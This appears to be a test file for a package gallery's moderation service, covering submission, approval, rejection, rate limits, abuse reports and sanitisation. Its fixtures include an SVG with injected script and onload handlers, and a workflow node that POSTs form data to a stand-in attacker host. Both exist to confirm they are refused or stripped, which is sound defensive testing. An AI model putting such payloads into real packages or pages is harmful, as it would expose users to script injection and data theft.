/**
 * Community gallery moderation flow (migration 20261117000000,
 * lib/services/gallery-community) against a LOCAL stack: submit (validated
 * at once, stored privately, queued), nothing public before approval,
 * non-moderators can't moderate, approve (re-validated, listed as
 * Community, version history, downloads), reject with a reason, emails on
 * every decision, rate limits, malicious packages refused, SVG screenshots
 * sanitised, abuse reports and unlisting, the public community index, and
 * the headless verification of a native package in a scratch workspace.
 *
 * Runs when EVENT_STREAM_DB_URL is set (local Supabase stack: PostgREST +
 * Storage), e.g.
 *   EVENT_STREAM_DB_URL=postgresql://postgres:postgres@127.0.0.1:54322/postgres npx vitest run __tests__/gallery-community-db.test.ts
 */
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { Client } from 'pg'

const sent: Array<{ to: string | string[]; subject: string; body: string }> = []
vi.mock('@/lib/email', () => ({ sendEmail: async (message: { to: string | string[]; subject: string; body: string }) => { sent.push(message); return { success: true, id: 'test' } } }))

import { buildGalleryPackage, galleryContents } from '@/lib/gallery/build'
import { readGallerySource } from '@/lib/gallery/source'
import { toPackageFiles } from '@/lib/packages/build'
import { packPackage } from '@/lib/packages/format'
import { ServiceError } from '@/lib/services/context'

/* eslint-disable @typescript-eslint/no-explicit-any -- rows and fixtures are untyped JSON */

const DB_URL = process.env.EVENT_STREAM_DB_URL
const API_URL = process.env.LOCKDOWN_SUPABASE_URL ?? 'http://127.0.0.1:54321'
const SERVICE_KEY = process.env.LOCKDOWN_SERVICE_ROLE_KEY
  ?? 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImV4cCI6MTk4MzgxMjk5Nn0.EGIM96RAZx35lJzdJsyH-qQwv8Hdp7fsn3W0YpN81IU'

const id = (n: number) => `0c6a1100-0000-4000-8000-${n.toString(16).padStart(12, '0')}`
const T = id(0xa)
const AUTHOR = id(1)
const OTHER = id(2)
const MOD = id(3)
const SPAMMER = id(4)
const SECOND = id(5)
const users = { [AUTHOR]: 'author@gallery-test.example', [OTHER]: 'other@gallery-test.example', [MOD]: 'moderator@gallery-test.example', [SPAMMER]: 'spam@gallery-test.example', [SECOND]: 'second@gallery-test.example' }

/** Moderator check stand-in: the instance-admin list is the moderator alone. */
const moderators = async (user: { id: string }) => user.id === MOD

const native = readGallerySource('visitor-sign-in')
/** The native exemplar under its own community package id / slug / version. */
function communityPackage(opts: { uid?: string; slug?: string; version?: string; mutate?: (c: any) => void } = {}): Uint8Array {
  const contents = structuredClone(galleryContents(native)) as any
  contents.header = { ...contents.header, id: opts.uid ?? id(0x5001), slug: opts.slug ?? 'community-visitor-desk', version: opts.version ?? '1.0.0', author: 'Grace Example', name: 'Community visitor desk' }
  opts.mutate?.(contents)
  const laid = toPackageFiles(contents)
  return packPackage({ header: laid.header, files: laid.files, signingKeyPem: null }).bytes
}

const listing = (extra: Record<string, unknown> = {}) => ({
  title: 'Community visitor desk',
  summary: 'A reception form signs visitors in and emails their host; works with nothing to configure.',
  description: 'Visitors sign in on a themed form, pick their host from the Staff directory table and the host is emailed. An NDA task follows when confidential information is involved.',
  category: 'workplace',
  tags: ['visitors', 'reception'],
  author_name: 'Grace Example',
  author_url: 'https://example.com/grace',
  sample_input: { visitor_name: 'Grace Kim', company: 'Northwind Traders', host: 'ana.lopez@example.com', purpose: 'Meeting', nda_required: true, agree: true },
  expect: 'waiting',
  ...extra,
})

const svgShot = { name: 'flow.svg', type: 'image/svg+xml', bytes: new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="20" onload="alert(1)"><script>alert(2)</script><rect width="40" height="20" fill="#0F766E"/><a href="https://attacker.test"><text y="15">hi</text></a></svg>') }

describe.skipIf(!DB_URL)('community gallery moderation (local DB)', () => {
  const db = new Client({ connectionString: DB_URL })
  const prev = { url: process.env.NEXT_PUBLIC_SUPABASE_URL, key: process.env.SUPABASE_SERVICE_ROLE_KEY, flag: process.env.GALLERY_COMMUNITY, email: process.env.EMAIL_PROVIDER }
  let svc: typeof import('@/lib/services/gallery-community')

  async function cleanup() {
    const { rows } = await db.query(`SELECT file_path, screenshots FROM public.gallery_submissions WHERE submitter_id = ANY($1)`, [Object.keys(users)])
    if (rows.length) {
      const { getStorageProvider } = await import('@/lib/providers/storage')
      const storage = await getStorageProvider()
      await storage.delete('gallery-community', rows.flatMap((r: any) => [r.file_path, ...(r.screenshots ?? []).map((s: any) => s.path)])).catch(() => undefined)
    }
    await db.query(`DELETE FROM public.community_packages WHERE owner_id = ANY($1) OR slug LIKE 'community-visitor-desk%'`, [Object.keys(users)])
    await db.query(`DELETE FROM public.gallery_submissions WHERE submitter_id = ANY($1)`, [Object.keys(users)])
    await db.query(`DELETE FROM public.users WHERE id = ANY($1)`, [Object.keys(users)])
    await db.query(`DELETE FROM public.tenants WHERE id = $1`, [T])
  }

  beforeAll(async () => {
    process.env.NEXT_PUBLIC_SUPABASE_URL = API_URL
    process.env.SUPABASE_SERVICE_ROLE_KEY = SERVICE_KEY
    process.env.GALLERY_COMMUNITY = 'on'
    process.env.EMAIL_PROVIDER = 'console'
    svc = await import('@/lib/services/gallery-community')
    await db.connect()
    await cleanup()
    await db.query(`INSERT INTO public.tenants (id, name, slug) VALUES ($1, 'Gallery test', 'gallery-community-test')`, [T])
    for (const [user, email] of Object.entries(users)) {
      await db.query(`INSERT INTO public.users (id, tenant_id, current_tenant_id, email, display_name) VALUES ($1, $2, $2, $3, 'Gallery user')`, [user, T, email])
    }
  }, 60_000)

  afterAll(async () => {
    await cleanup().catch(() => undefined)
    await db.end()
    process.env.NEXT_PUBLIC_SUPABASE_URL = prev.url
    process.env.SUPABASE_SERVICE_ROLE_KEY = prev.key
    process.env.GALLERY_COMMUNITY = prev.flag
    process.env.EMAIL_PROVIDER = prev.email
  })

  const author = { id: AUTHOR, email: users[AUTHOR] }
  let firstId = ''

  it('queues a valid submission privately, with sanitised screenshots; nothing is public yet', async () => {
    const submission = await svc.submitCommunityPackage(author, { file: { name: 'community-visitor-desk-1.0.0.utpkg', bytes: communityPackage() }, listing: listing(), screenshots: [svgShot] }, { ip: '203.0.113.10' })
    firstId = submission.id
    expect(submission).toMatchObject({ status: 'pending', slug: 'community-visitor-desk', version: '1.0.0' })
    expect(submission.validation.ok).toBe(true)
    expect((await svc.listCommunityPackages()).some((p) => p.slug === 'community-visitor-desk')).toBe(false)
    await expect(svc.downloadCommunityPackage('community-visitor-desk')).rejects.toThrow(/not found/i)
    // The stored SVG has no script, handler or external link.
    const shot = await svc.readScreenshot({ submissionId: firstId }, 1, author, moderators)
    const svg = new TextDecoder().decode(shot.bytes)
    expect(shot.type).toBe('image/svg+xml')
    expect(svg).not.toMatch(/script|onload|attacker/)
    expect(svg).toMatch(/<rect/)
    // Another user can't see someone else's pending screenshot.
    await expect(svc.readScreenshot({ submissionId: firstId }, 1, { id: OTHER }, moderators)).rejects.toThrow(/not found/i)
    expect((await svc.listMySubmissions(author)).map((s) => s.id)).toContain(firstId)
    expect(sent.some((m) => m.to === users[AUTHOR] && /received/.test(m.subject))).toBe(true)
  })

  it('refuses malicious packages, bad screenshots and an official slug; nothing is stored', async () => {
    const before = (await db.query(`SELECT count(*)::int AS n FROM public.gallery_submissions WHERE submitter_id = $1`, [OTHER])).rows[0].n
    const exfil = communityPackage({ uid: id(0x5002), slug: 'community-visitor-desk-evil', mutate: (c) => {
      const wf = c.assets.workflows[0]
      wf.nodes.push({ id: 'exfil', type: 'http_request', label: 'Exfiltrate', position: { x: 0, y: 0 }, config: { url: 'https://attacker.test/collect', method: 'POST', body: '{{form}}' } })
      wf.edges.push({ id: 'e-exfil', source: 'row', target: 'exfil' })
    } })
    const error = await svc.submitCommunityPackage({ id: OTHER, email: users[OTHER] }, { file: { name: 'evil.utpkg', bytes: exfil }, listing: listing() }).catch((e) => e)
    expect(error).toBeInstanceOf(ServiceError)
    expect(error.status).toBe(400)
    expect(JSON.stringify(error.details)).toMatch(/http_request/)
    const fakePng = { name: 'x.png', type: 'image/png', bytes: new TextEncoder().encode('<html>not a png</html>') }
    await expect(svc.submitCommunityPackage({ id: OTHER }, { file: { name: 'ok.utpkg', bytes: communityPackage({ uid: id(0x5003), slug: 'community-visitor-desk-b' }) }, listing: listing(), screenshots: [fakePng] })).rejects.toThrow(/not a valid PNG/)
    await expect(svc.submitCommunityPackage({ id: OTHER }, { file: { name: 'official.utpkg', bytes: communityPackage({ uid: id(0x5004), slug: 'expense-claims' }) }, listing: listing() })).rejects.toThrow(/official package/)
    await expect(svc.submitCommunityPackage({ id: OTHER }, { file: { name: 'x.utpkg', bytes: communityPackage({ uid: id(0x5005), slug: 'community-visitor-desk-c' }) }, listing: listing({ title: '<b>x</b>' }) })).rejects.toThrow(/listing/)
    const after = (await db.query(`SELECT count(*)::int AS n FROM public.gallery_submissions WHERE submitter_id = $1`, [OTHER])).rows[0].n
    expect(after).toBe(before)
  })

  it('rate limits submissions per user', async () => {
    const results: string[] = []
    for (let i = 0; i < 6; i++) {
      const outcome = await svc.submitCommunityPackage({ id: SPAMMER }, { file: { name: 'bad.utpkg', bytes: new Uint8Array([1, 2, 3]) }, listing: listing() }, { ip: `198.51.100.${i}` }).catch((e: ServiceError) => e.code)
      results.push(String(outcome))
    }
    expect(results.slice(0, 5).every((r) => r === 'validation_error')).toBe(true)
    expect(results[5]).toBe('rate_limited')
  })

  it('lets only moderators review', async () => {
    await expect(svc.listModerationQueue({ id: AUTHOR }, {}, moderators)).rejects.toMatchObject({ code: 'forbidden' })
    await expect(svc.decideSubmission({ id: AUTHOR }, firstId, { decision: 'approve' }, moderators)).rejects.toMatchObject({ code: 'forbidden' })
    await expect(svc.decideSubmission(null, firstId, { decision: 'approve' }, moderators)).rejects.toMatchObject({ code: 'unauthorized' })
    // The real check (instance admins by verified email) refuses an ordinary user.
    await expect(svc.decideSubmission({ id: AUTHOR, email: users[AUTHOR] }, firstId, { decision: 'approve' })).rejects.toMatchObject({ code: 'forbidden' })
    const queue = await svc.listModerationQueue({ id: MOD }, { status: 'pending' }, moderators)
    expect(queue.map((s: any) => s.id)).toContain(firstId)
  })

  it('verifies a native package headlessly in a scratch workspace', async () => {
    const verification: any = await svc.verifySubmission({ id: MOD }, firstId, moderators)
    expect(verification.status).toBe('passed')
    expect(verification.detail).toMatch(/form submitted/)
    expect(verification.native).toBe(true)
    // The scratch workspace is gone again.
    expect(verification.workspace).toMatch(/^gallery-verify-/)
    const { rows } = await db.query(`SELECT count(*)::int AS n FROM public.tenants WHERE slug = $1`, [verification.workspace])
    expect(rows[0].n).toBe(0)
  }, 120_000)

  it('approves: re-validated, listed as Community with version history, downloads counted, author emailed', async () => {
    sent.length = 0
    const result = await svc.decideSubmission({ id: MOD }, firstId, { decision: 'approve', reason: 'Nice and tidy.' }, moderators)
    expect(result).toMatchObject({ status: 'approved', slug: 'community-visitor-desk' })
    const pkg = await svc.getCommunityPackage('community-visitor-desk')
    expect(pkg).toMatchObject({ title: 'Community visitor desk', author_name: 'Grace Example', licence: 'Apache-2.0', native: true, trigger: 'form', current_version: '1.0.0', downloads: 0 })
    expect(pkg!.versions.map((v) => v.version)).toEqual(['1.0.0'])
    const entry = svc.communityIndexEntry(pkg!, 'https://usertasks.example.com')
    expect(entry).toMatchObject({ source: 'community', native: true, file: 'https://usertasks.example.com/api/gallery/community/community-visitor-desk/download', author: { name: 'Grace Example' } })
    const file = await svc.downloadCommunityPackage('community-visitor-desk')
    expect(file.file_name).toBe('community-visitor-desk-1.0.0.utpkg')
    expect((await svc.getCommunityPackage('community-visitor-desk'))!.downloads).toBe(1)
    const shot = await svc.readScreenshot({ slug: 'community-visitor-desk' }, 1)
    expect(new TextDecoder().decode(shot.bytes)).not.toMatch(/script/)
    expect(sent.some((m) => m.to === users[AUTHOR] && /live in the community gallery/.test(m.subject) && /gallery\/community\/community-visitor-desk/.test(m.body))).toBe(true)
    await expect(svc.decideSubmission({ id: MOD }, firstId, { decision: 'reject', reason: 'late' }, moderators)).rejects.toMatchObject({ code: 'conflict' })
  })

  it('keeps package ownership and version order: only the author publishes newer versions', async () => {
    await expect(svc.submitCommunityPackage({ id: OTHER }, { file: { name: 'takeover.utpkg', bytes: communityPackage({ version: '2.0.0' }) }, listing: listing() })).rejects.toMatchObject({ code: 'conflict' })
    await expect(svc.submitCommunityPackage(author, { file: { name: 'same.utpkg', bytes: communityPackage({ version: '1.0.0' }) }, listing: listing() })).rejects.toThrow(/not newer/)
    const next = await svc.submitCommunityPackage(author, { file: { name: 'next.utpkg', bytes: communityPackage({ version: '1.1.0' }) }, listing: listing({ notes: 'Adds a badge colour.' }) })
    await svc.decideSubmission({ id: MOD }, next.id, { decision: 'approve' }, moderators)
    const pkg = await svc.getCommunityPackage('community-visitor-desk')
    expect(pkg!.current_version).toBe('1.1.0')
    expect(pkg!.versions.map((v) => v.version)).toEqual(['1.1.0', '1.0.0'])
    expect((await svc.downloadCommunityPackage('community-visitor-desk', '1.0.0')).file_name).toBe('community-visitor-desk-1.0.0.utpkg')
  })

  it('rejects with a reason (required) and emails it', async () => {
    sent.length = 0
    const other = await svc.submitCommunityPackage({ id: SECOND, email: users[SECOND] }, { file: { name: 'other.utpkg', bytes: communityPackage({ uid: id(0x5006), slug: 'community-visitor-desk-other' }) }, listing: listing({ title: 'Another desk' }) })
    await expect(svc.decideSubmission({ id: MOD }, other.id, { decision: 'reject' }, moderators)).rejects.toThrow(/reason/)
    expect(await svc.decideSubmission({ id: MOD }, other.id, { decision: 'reject', reason: 'Duplicates an existing package.' }, moderators)).toEqual({ status: 'rejected' })
    expect((await svc.getCommunityPackage('community-visitor-desk-other'))).toBeNull()
    expect(sent.some((m) => m.to === users[SECOND] && /not approved/.test(m.subject) && /Duplicates an existing package/.test(m.body))).toBe(true)
    expect((await svc.listMySubmissions({ id: SECOND })).find((s) => s.id === other.id)).toMatchObject({ status: 'rejected', decision_reason: 'Duplicates an existing package.' })
  })

  it('takes abuse reports and unlists a package', async () => {
    await svc.reportAbuse({ slug: 'community-visitor-desk', reason: 'spam', details: '<b>looks</b> fake' }, { ip: '192.0.2.50' })
    await expect(svc.reportAbuse({ slug: 'community-visitor-desk', reason: 'nonsense' }, { ip: '192.0.2.50' })).rejects.toThrow(/reason/)
    await expect(svc.listAbuseReports({ id: AUTHOR }, moderators)).rejects.toMatchObject({ code: 'forbidden' })
    const reports = await svc.listAbuseReports({ id: MOD }, moderators)
    const report: any = reports.find((r: any) => r.community_packages?.slug === 'community-visitor-desk')
    expect(report.details).toBe('blooks/b fake')
    await svc.resolveAbuseReport({ id: MOD }, report.id, 'unlist', moderators)
    expect(await svc.getCommunityPackage('community-visitor-desk')).toBeNull()
    await expect(svc.downloadCommunityPackage('community-visitor-desk')).rejects.toThrow(/not found/i)
  })
})
